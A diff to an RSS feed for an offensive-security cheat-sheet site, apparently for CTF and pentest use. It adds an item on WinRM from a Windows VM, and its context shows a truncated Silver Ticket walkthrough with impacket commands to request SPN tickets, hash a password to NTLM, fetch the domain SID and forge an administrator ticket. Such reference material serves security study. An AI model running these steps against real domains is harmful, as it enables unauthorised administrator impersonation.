@@ -77,5 +77,12 @@
       <guid>https://tldrbins.github.io/silver_ticket/</guid>
       <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 4. Generate Silver Ticket impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator 5.</description>
     </item>
+    <item>
+      <title>Winrm from Windows VM</title>
+      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
+      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
+    </item>
   </channel>
 </rss>
